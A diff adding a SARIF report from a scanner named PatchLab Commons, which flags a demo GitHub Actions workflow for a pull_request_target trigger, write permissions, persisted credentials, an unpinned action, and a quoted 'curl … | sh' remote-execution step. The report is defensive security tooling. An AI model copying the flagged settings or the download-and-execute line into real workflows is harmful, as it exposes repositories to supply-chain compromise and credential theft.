@@ -1,0 +1,326 @@
+{
+  "$schema": "https://json.schemastore.org/sarif-2.1.0.json",
+  "runs": [
+    {
+      "automationDetails": {
+        "id": "patchlab/f5232c951115..5004d7fba488"
+      },
+      "properties": {
+        "baseSha": "f5232c951115ad94f350d5272499e601a95d5e75",
+        "headSha": "5004d7fba488e97112b6e646d4458aa730d78f2b",
+        "outcome": "fail",
+        "project": "patchlab-blocked-workflow-demo"
+      },
+      "results": [
+        {
+          "level": "warning",
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": ".github/workflows/ci.yml"
+                }
+              }
+            }
+          ],
+          "message": {
+            "text": ".github/workflows/ci.yml changes repository automation and its effective permissions."
+          },
+          "properties": {
+            "disposition": "review",
+            "evidence": ""
+          },
+          "ruleId": "PL-GHA-001"
+        },
+        {
+          "level": "error",
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": ".github/workflows/ci.yml"
+                },
+                "region": {
+                  "startLine": 3
+                }
+              }
+            }
+          ],
+          "message": {
+            "text": "pull_request_target can expose privileged context to untrusted pull-request data."
+          },
+          "properties": {
+            "disposition": "deny",
+            "evidence": "pull_request_target:"
+          },
+          "ruleId": "PL-GHA-003"
+        },
+        {
+          "level": "error",
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": ".github/workflows/ci.yml"
+                },
+                "region": {
+                  "startLine": 5
+                }
+              }
+            }
+          ],
+          "message": {
+            "text": "A GitHub Actions write permission was added: contents: write"
+          },
+          "properties": {
+            "disposition": "deny",
+            "evidence": "contents: write"
+          },
+          "ruleId": "PL-GHA-002"
+        },
+        {
+          "level": "warning",
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": ".github/workflows/ci.yml"
+                },
+                "region": {
+                  "startLine": 10
+                }
+              }
+            }
+          ],
+          "message": {
+            "text": "actions/checkout@v4 uses a mutable tag or branch."
+          },
+          "properties": {
+            "disposition": "review",
+            "evidence": "actions/checkout@v4"
+          },
+          "ruleId": "PL-GHA-007"
+        },
+        {
+          "level": "error",
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": ".github/workflows/ci.yml"
+                },
+                "region": {
+                  "startLine": 12
+                }
+              }
+            }
+          ],
+          "message": {
+            "text": "actions/checkout credentials are explicitly persisted in the working copy."
+          },
+          "properties": {
+            "disposition": "deny",
+            "evidence": "persist-credentials: true"
+          },
+          "ruleId": "PL-GHA-004"
+        },
+        {
+          "level": "error",
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": ".github/workflows/ci.yml"
+                },
+                "region": {
+                  "startLine": 13
+                }
+              }
+            }
+          ],
+          "message": {
+            "text": "The workflow downloads content and executes it directly in a shell."
+          },
+          "properties": {
+            "disposition": "deny",
+            "evidence": "- run: curl https://example.invalid/install.sh | sh"
+          },
+          "ruleId": "PL-GHA-006"
+        },
+        {
+          "level": "warning",
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": ".github/workflows/ci.yml"
+                },
+                "region": {
+                  "startLine": 13
+                }
+              }
+            }
+          ],
+          "message": {
+            "text": "A command-line network client was added."
+          },
+          "properties": {
+            "disposition": "review",
+            "evidence": "- run: curl https://example.invalid/install.sh | sh"
+          },
+          "ruleId": "PL-NET-001"
+        }
+      ],
+      "tool": {
+        "driver": {
+          "informationUri": "https://github.com/xordanblu/patchlab-commons",
+          "name": "PatchLab Commons",
+          "rules": [
+            {
+              "fullDescription": {
+                "text": ".github/workflows/ci.yml changes repository automation and its effective permissions."
+              },
+              "help": {
+                "text": "Review the event trigger, permissions, secrets, external actions, and shell steps."
+              },
+              "id": "PL-GHA-001",
+              "name": "pl_gha_001",
+              "properties": {
+                "disposition": "review",
+                "tags": [
+                  "github-actions",
+                  "permissions"
+                ]
+              },
+              "shortDescription": {
+                "text": "GitHub Actions workflow changed"
+              }
+            },
+            {
+              "fullDescription": {
+                "text": "A GitHub Actions write permission was added: contents: write"
+              },
+              "help": {
+                "text": "Use read-only permissions by default and grant one narrow write permission only where required."
+              },
+              "id": "PL-GHA-002",
+              "name": "pl_gha_002",
+              "properties": {
+                "disposition": "deny",
+                "tags": [
+                  "github-actions",
+                  "least-privilege"
+                ]
+              },
+              "shortDescription": {
+                "text": "Write permission added"
+              }
+            },
+            {
+              "fullDescription": {
+                "text": "pull_request_target can expose privileged context to untrusted pull-request data."
+              },
+              "help": {
+                "text": "Use pull_request with read-only permissions, or isolate all untrusted checkout and input handling."
+              },
+              "id": "PL-GHA-003",
+              "name": "pl_gha_003",
+              "properties": {
+                "disposition": "deny",
+                "tags": [
+                  "github-actions",
+                  "untrusted-input"
+                ]
+              },
+              "shortDescription": {
+                "text": "pull_request_target trigger added"
+              }
+            },
+            {
+              "fullDescription": {
+                "text": "actions/checkout credentials are explicitly persisted in the working copy."
+              },
+              "help": {
+                "text": "Set persist-credentials to false unless a reviewed write step requires it."
+              },
+              "id": "PL-GHA-004",
+              "name": "pl_gha_004",
+              "properties": {
+                "disposition": "deny",
+                "tags": [
+                  "github-actions",
+                  "credentials"
+                ]
+              },
+              "shortDescription": {
+                "text": "Git credentials persisted"
+              }
+            },
+            {
+              "fullDescription": {
+                "text": "The workflow downloads content and executes it directly in a shell."
+              },
+              "help": {
+                "text": "Download a pinned artifact, verify its digest, and execute only after review."
+              },
+              "id": "PL-GHA-006",
+              "name": "pl_gha_006",
+              "properties": {
+                "disposition": "deny",
+                "tags": [
+                  "github-actions",
+                  "supply-chain"
+                ]
+              },
+              "shortDescription": {
+                "text": "Remote script execution added"
+              }
+            },
+            {
+              "fullDescription": {
+                "text": "actions/checkout@v4 uses a mutable tag or branch."
+              },
+              "help": {
+                "text": "Pin third-party actions to a reviewed 40-character commit SHA."
+              },
+              "id": "PL-GHA-007",
+              "name": "pl_gha_007",
+              "properties": {
+                "disposition": "review",
+                "tags": [
+                  "github-actions",
+                  "supply-chain"
+                ]
+              },
+              "shortDescription": {
+                "text": "External action is not pinned by commit SHA"
+              }
+            },
+            {
+              "fullDescription": {
+                "text": "A command-line network client was added."
+              },
+              "help": {
+                "text": "Document the destination, data sent, timeout, retry policy, and trust boundary."
+              },
+              "id": "PL-NET-001",
+              "name": "pl_net_001",
+              "properties": {
+                "disposition": "review",
+                "tags": [
+                  "network",
+                  "capability"
+                ]
+              },
+              "shortDescription": {
+                "text": "Network capability added"
+              }
+            }
+          ],
+          "version": "0.1.0"
+        }
+      }
+    }
+  ],
+  "version": "2.1.0"
+}
